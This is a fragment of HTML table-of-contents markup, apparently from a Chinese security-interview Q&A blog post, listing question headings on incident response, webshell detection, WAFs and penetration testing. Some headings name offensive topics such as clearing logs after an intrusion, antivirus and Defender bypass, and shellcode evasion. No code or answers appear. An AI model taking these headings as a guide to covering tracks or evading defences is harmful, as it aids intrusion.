href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-CSRF"><span class="nav-number">64.</span> <span class="nav-text">如何防止 CSRF?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="nav-number">65.</span> <span class="nav-text">代码执行，文件读取，命令执行的函数都有哪些？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#img-%E6%A0%87%E7%AD%BE%E9%99%A4%E4%BA%86-onerror-%E5%B1%9E%E6%80%A7%E5%A4%96%EF%BC%8C%E8%BF%98%E6%9C%89%E5%85%B6%E4%BB%96%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B7%AF%E5%BE%84%E7%9A%84%E5%8A%9E%E6%B3%95%E5%90%97%EF%BC%9F"><span class="nav-number">66.</span> <span class="nav-text">img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#img-%E6%A0%87%E7%AD%BE%E9%99%A4%E4%BA%86-onerror-%E5%B1%9E%E6%80%A7%E5%A4%96%EF%BC%8C%E5%B9%B6%E4%B8%94-src-%E5%B1%9E%E6%80%A7%E7%9A%84%E5%90%8E%E7%BC%80%E5%90%8D%EF%BC%8C%E5%BF%85%E9%A1%BB%E4%BB%A5-jpg-%E7%BB%93%E5%B0%BE%EF%BC%8C%E6%80%8E%E4%B9%88%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E8%B7%AF%E5%BE%84%E3%80%82"><span class="nav-number">67.</span> <span class="nav-text">img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以.jpg 结尾，怎么获取管理员路径。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-aspx-%E6%9C%A8%E9%A9%AC%E6%9D%83%E9%99%90%E6%AF%94-asp-%E5%A4%A7%EF%BC%9F"><span class="nav-number">68.</span> <span class="nav-text">为什么 aspx 木马权限比 asp 大？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-waf%EF%BC%9F"><span class="nav-number">69.</span> <span class="nav-text">如何绕过 waf？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%89%E5%93%AA%E4%BA%9B%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F"><span class="nav-number">70.</span> <span class="nav-text">文件上传有哪些防护方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%9C%89%E9%98%B2%E6%8A%A4%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="nav-number">71.</span> <span class="nav-text">注入有防护怎么办</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ddos-%E5%A6%82%E4%BD%95%E9%98%B2%E6%8A%A4"><span class="nav-number">72.</span> <span class="nav-text">ddos 如何防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%E5%8F%AF%E4%BB%A5%E9%98%B2%E6%AD%A2-sql-%E6%B3%A8%E5%85%A5"><span class="nav-number">73.</span> <span class="nav-text">为什么参数化查询可以防止 sql 注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql-%E5%A6%82%E4%BD%95%E5%86%99-shell-%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="nav-number">74.</span> <span class="nav-text">sql 如何写 shell&#x2F;单引号被过滤怎么办</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E4%BA%8E-XSS-%E6%80%8E%E4%B9%88%E4%BF%AE%E8%A1%A5%E5%BB%BA%E8%AE%AE"><span class="nav-number">75.</span> <span class="nav-text">对于 XSS 怎么修补建议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0-token%E5%92%8C-referer-%E5%81%9A%E6%A8%AA%E5%90%91%E5%AF%B9%E6%AF%94%EF%BC%8C%E8%B0%81%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E9%AB%98%EF%BC%9F"><span class="nav-number">76.</span> <span class="nav-text">添加 token和 referer 做横向对比，谁安全等级高？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">77.</span> <span class="nav-text">常见的上传绕过方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">78.</span> <span class="nav-text">导致文件包含的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A5%E4%BE%B5-Linux-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E9%9C%80%E8%A6%81%E6%B8%85%E9%99%A4%E5%93%AA%E4%BA%9B%E6%97%A5%E5%BF%97%EF%BC%9F"><span class="nav-number">79.</span> <span class="nav-text">入侵 Linux 服务器后需要清除哪些日志？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%8A%A0%E5%9B%BA%E4%B8%80%E4%B8%AA%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84-Windows-%E6%A1%8C%E9%9D%A2%E5%B7%A5%E4%BD%9C%E7%8E%AF%E5%A2%83%EF%BC%9F%E8%AF%B7%E7%BB%99%E5%87%BA%E4%BD%A0%E7%9A%84%E6%80%9D%E8%B7%AF%E3%80%82"><span class="nav-number">80.</span> <span class="nav-text">如何加固一个域环境下的 Windows 桌面工作环境？请给出你的思路。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9D%E5%A1%94%E7%A6%81%E6%AD%A2PHP%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="nav-number">81.</span> <span class="nav-text">宝塔禁止PHP函数如何绕过？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="nav-number">82.</span> <span class="nav-text">fastjson不出网如何利用？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E7%9A%84%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%EF%BC%88%E9%9D%9E%E5%9F%9F%E7%94%A8%E6%88%B7%EF%BC%89%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="nav-number">83.</span> <span class="nav-text">域内的一个普通用户（非域用户）如何进行利用？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#go%E8%AF%AD%E8%A8%80%E5%85%8D%E6%9D%80shellcode%E5%A6%82%E4%BD%95%E5%85%8D%E6%9D%80%EF%BC%9F%E5%85%8D%E6%9D%80%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-number">84.</span> <span class="nav-text">go语言免杀shellcode如何免杀？免杀原理是什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-defender%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E5%8E%9F%E7%90%86%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%EF%BC%9F"><span class="nav-number">85.</span> <span class="nav-text">windows defender防御机制原理，如何绕过？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E8%BF%9B%E7%A8%8B%E4%BF%9D%E6%8A%A4%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E8%BF%9B%E8%A1%8C%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB%EF%BC%9F"><span class="nav-number">86.</span> <span class="nav-text">卡巴斯基进程保护如何绕过进行进程迁移？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%EF%BC%9F"><span class="nav-number">87.</span> <span class="nav-text">工作组环境下如何进行渗透？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%9C%BA%E5%88%B6%EF%BC%9F"><span class="nav-number">88.</span> <span class="nav-text">内存马的机制？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B4%E5%87%BA%E5%8D%B0%E8%B1%A1%E6%AF%94%E8%BE%83%E6%B7%B1%E5%88%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91%EF%BC%9F"><span class="nav-number">89.</span> <span class="nav-text">说出印象比较深刻的一次外网打点进入内网？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%81%E4%B9%A6%E9%80%8F%E6%98%8E%E5%BA%A6%E7%9A%84%E5%8D%B1%E5%AE%B3%EF%BC%9F"><span class="nav-number">90.</span> <span class="nav-text">证书透明度的危害？</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF%E6%B5%81%E7%A8%8B"><span class="nav-number">1.</span> <span class="nav-text">应急响应基本思路流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">Windows入侵排查思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">框架漏洞&amp;常见命令注入漏洞？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E8%AE%BE%E5%A4%87"><span class="nav-number">4.</span> <span class="nav-text">常见安全工具、设备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ddos-cc%E5%BA%94%E6%80%A5%E6%80%9D%E8%B7%AF%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83"><span class="nav-number">5.</span> <span class="nav-text">DDOS CC应急思路以及如何防范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AD%98%E5%9C%A8webshell%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86"><span class="nav-number">6.</span> <span class="nav-text">服务器存在webshell，如何处理？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%92%E6%9F%A5shell-%E5%BA%94%E8%AF%A5%E7%94%A8%E4%BB%80%E4%B9%88%E5%91%BD%E4%BB%A4%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%8E%92%E6%9F%A5"><span class="nav-number">7.</span> <span class="nav-text">排查shell
+应该用什么命令来进行排查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8Bwebshell"><span class="nav-number">8.</span> <span class="nav-text">如何检测webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="nav-number">9.</span> <span class="nav-text">Webshell管理工具的流量特征</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%BC%8F%E6%B4%9E"><span class="nav-number">10.</span> <span class="nav-text">常见端口漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%A4%E6%96%AD%E6%8C%96%E7%9F%BF%E5%B8%B8%E8%A7%81%E6%89%8B%E6%AE%B5%E5%A4%84%E7%90%86"><span class="nav-number">11.</span> <span class="nav-text">挖矿病毒判断&amp;挖矿常见手段&amp;处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85%E6%88%96%E8%80%85%E6%97%A5%E5%BF%97%E4%BD%A0%E7%9A%84%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">12.</span> <span class="nav-text">数据包或者日志，你的分析思路是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9C%89%E7%9C%8B%E8%BF%87%E7%9B%B8%E5%85%B3%E6%97%A5%E5%BF%97%E5%90%97"><span class="nav-number">13.</span> <span class="nav-text">文件上传和命令执行，有看过相关日志吗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="nav-number">14.</span> <span class="nav-text">windows日志分析工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7%E5%91%BD%E4%BB%A4"><span class="nav-number">15.</span> <span class="nav-text">Linux日志分析技巧命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%99%E4%BD%A0%E4%B8%80%E4%B8%AA%E6%AF%94%E8%BE%83%E5%A4%A7%E7%9A%84%E6%97%A5%E5%BF%97%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90"><span class="nav-number">16.</span> <span class="nav-text">给你一个比较大的日志，应该如何分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E5%9C%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E5%9C%BA%E6%99%AF"><span class="nav-number">17.</span> <span class="nav-text">Windows在应急响应中的安全日志以及对应场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E8%AF%AF%E6%8A%A5%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86"><span class="nav-number">18.</span> <span class="nav-text">设备误报如何处理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E5%92%8Clinux%E7%9A%84%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%94%BE%E5%9C%A8%E5%93%AA%E9%87%8C"><span class="nav-number">19.</span> <span class="nav-text">Windows和Linux的日志文件放在哪里</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AD%98shell"><span class="nav-number">20.</span> <span class="nav-text">如何查看系统内存shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8E%92%E6%9F%A5"><span class="nav-number">21.</span> <span class="nav-text">Java 内存马排查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9web%E7%AB%AF%E5%8F%A3%E5%A6%82%E6%9E%9C%E4%B8%8D%E8%83%BD%E4%BF%AE%E6%94%B9%E7%AB%AF%E5%8F%A3%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">22.</span> <span class="nav-text">如何修改WEB端口？如果不能修改端口还有什么利用方法？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E9%80%9A%E5%B8%B8%E4%BC%9A%E8%AF%BB%E5%93%AA%E4%BA%9B%E6%96%87%E4%BB%B6linux%E5%92%8Cwindows%E9%83%BD%E8%B0%88%E8%B0%88"><span class="nav-number">23.</span> <span class="nav-text">获得文件读取漏洞，通常会读哪些文件，Linux和windows都谈谈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E7%AB%AF%E5%8F%A3%E8%BF%9B%E7%A8%8B%E9%97%B4%E8%BD%AC%E6%8D%A2"><span class="nav-number">24.</span> <span class="nav-text">windows端口进程间转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%94%BB%E5%87%BB%E7%89%B9%E5%BE%81"><span class="nav-number">25.</span> <span class="nav-text">文件上传攻击特征？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8A%A0%E5%9B%BA%E6%96%B9%E6%B3%95"><span class="nav-number">26.</span> <span class="nav-text">文件上传加固方法？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%A0%E8%BF%98%E7%94%A8%E8%BF%87%E5%85%B6%E4%BB%96%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E7%9A%84%E4%BA%A7%E5%93%81%E5%90%97"><span class="nav-number">27.</span> <span class="nav-text">你还用过其他态势感知的产品吗？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E5%A4%84%E7%BD%AE"><span class="nav-number">28.</span> <span class="nav-text">钓鱼邮件处置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8B%E5%8C%BA%E5%88%86%E6%98%AF%E6%89%AB%E6%8F%8F%E6%B5%81%E9%87%8F%E5%92%8C%E6%89%8B%E5%8A%A8%E6%B5%81%E9%87%8F"><span class="nav-number">29.</span> <span class="nav-text">如何查看区分是扫描流量和手动流量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E9%98%B2%E5%BE%A1"><span class="nav-number">30.</span> <span class="nav-text">️入侵检测&amp;防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#waf%E4%BA%A7%E5%93%81%E5%A6%82%E4%BD%95%E6%9D%A5%E6%8B%A6%E6%88%AA%E6%94%BB%E5%87%BB"><span class="nav-number">31.</span> <span class="nav-text">WAF产品如何来拦截攻击？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#waf%E6%9C%89%E5%93%AA%E4%BA%9B%E9%98%B2%E6%8A%A4%E6%96%B9%E5%BC%8F"><span class="nav-number">32.</span> <span class="nav-text">WAF有哪些防护方式？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E5%81%9A%E5%89%8D%E7%BD%AE%E8%A7%84%E9%81%BF"><span class="nav-number">33.</span> <span class="nav-text">不安全的第三方组件的漏洞如何做前置规避？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E6%9E%9C%E7%8E%B0%E5%9C%A8%E8%A6%81%E4%BD%A0%E5%86%99%E4%B8%80%E4%B8%AA%E6%A3%80%E6%B5%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="nav-number">34.</span> <span class="nav-text">如果现在要你写一个检测命令注入的脚本？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%AF%E6%BA%90%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="nav-number">35.</span> <span class="nav-text">️溯源基本步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8C%BA%E5%88%AB"><span class="nav-number">36.</span> <span class="nav-text">黄金票据和白银票据的一些区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">37.</span> <span class="nav-text">序列化与反序列化的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">38.</span> <span class="nav-text">常见的中间件漏洞？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E8%8F%9C%E5%88%80c-%E5%88%80%E5%86%B0%E8%9D%8E%E7%9A%84%E7%9B%B8%E5%90%8C%E4%B8%8E%E4%B8%8D%E7%9B%B8%E5%90%8C%E4%B9%8B%E5%A4%84"><span class="nav-number">39.</span> <span class="nav-text">蚁剑&#x2F;菜刀&#x2F;C
+刀&#x2F;冰蝎的相同与不相同之处</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%90%91-shell-%E5%92%8C%E5%8F%8D%E5%90%91-shell-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">40.</span> <span class="nav-text">正向 SHELL 和反向 SHELL
+的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95"><span class="nav-number">41.</span> <span class="nav-text">Windows 常用的提权方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-%E6%8F%90%E6%9D%83%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E6%B3%95"><span class="nav-number">42.</span> <span class="nav-text">Linux 提权有哪些方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">43.</span> <span class="nav-text">PHP 反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BD%95%E4%B8%80%E4%B8%AA-mysql-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%AB%99%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA-80-%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE"><span class="nav-number">44.</span> <span class="nav-text">为何一个 MYSQL
+数据库的站，只有一个 80 端口开放？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E6%88%90%E7%86%9F%E5%B9%B6%E4%B8%94%E7%9B%B8%E5%AF%B9%E5%AE%89%E5%85%A8%E7%9A%84-cms%E6%B8%97%E9%80%8F%E6%97%B6%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95%E7%9A%84%E6%84%8F%E4%B9%89"><span class="nav-number">45.</span> <span class="nav-text">一个成熟并且相对安全的
+CMS，渗透时扫描目录的意义？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E6%9F%90%E5%90%8E%E5%8F%B0%E6%96%B0%E9%97%BB%E7%BC%96%E8%BE%91%E7%95%8C%E9%9D%A2%E7%9C%8B%E5%88%B0%E7%BC%96%E8%BE%91%E5%99%A8%E5%BA%94%E8%AF%A5%E5%85%88%E5%81%9A%E4%BB%80%E4%B9%88"><span class="nav-number">46.</span> <span class="nav-text">在某后台新闻编辑界面看到编辑器，应该先做什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E6%9F%A5%E4%B8%8A%E4%BC%A0%E7%82%B9%E7%9A%84%E5%85%83%E7%B4%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%84%8F%E4%B9%89"><span class="nav-number">47.</span> <span class="nav-text">审查上传点的元素有什么意义？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#csrf-%E5%92%8C-xss-%E5%92%8C-xxe-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%E4%BB%A5%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="nav-number">48.</span> <span class="nav-text">CSRF 和 XSS 和 XXE
+有什么区别，以及修复方式？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5"><span class="nav-number">49.</span> <span class="nav-text">3389 无法连接的几种情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E7%AB%99%E6%97%A0%E9%98%B2%E6%8A%A4%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8%E8%AE%BF%E9%97%AE%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC%E6%A0%BC%E5%BC%8F%E8%AE%BF%E9%97%AE%E5%88%99-403%E4%BB%80%E4%B9%88%E5%8E%9F%E5%9B%A0"><span class="nav-number">50.</span> <span class="nav-text">目标站无防护，上传图片可以正常访问，上传脚本格式访问则
+403，什么原因？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E7%AB%99%E7%A6%81%E6%AD%A2%E6%B3%A8%E5%86%8C%E7%94%A8%E6%88%B7%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E5%A4%84%E9%9A%8F%E4%BE%BF%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E6%8F%90%E7%A4%BA%E6%AD%A4%E7%94%A8%E6%88%B7%E4%B8%8D%E5%AD%98%E5%9C%A8%E4%BD%A0%E8%A7%89%E5%BE%97%E8%BF%99%E9%87%8C%E6%80%8E%E6%A0%B7%E5%88%A9%E7%94%A8"><span class="nav-number">51.</span> <span class="nav-text">目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%AA%81%E7%A0%B4%E6%B3%A8%E5%85%A5%E6%97%B6%E5%AD%97%E7%AC%A6%E8%A2%AB%E8%BD%AC%E4%B9%89"><span class="nav-number">52.</span> <span class="nav-text">如何突破注入时字符被转义？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%BF%E5%88%B0%E4%B8%80%E4%B8%AA-webshell-%E5%8F%91%E7%8E%B0%E7%BD%91%E7%AB%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%9C%89.htaccess-%E6%96%87%E4%BB%B6%E6%88%91%E4%BB%AC%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88"><span class="nav-number">53.</span> <span class="nav-text">拿到一个
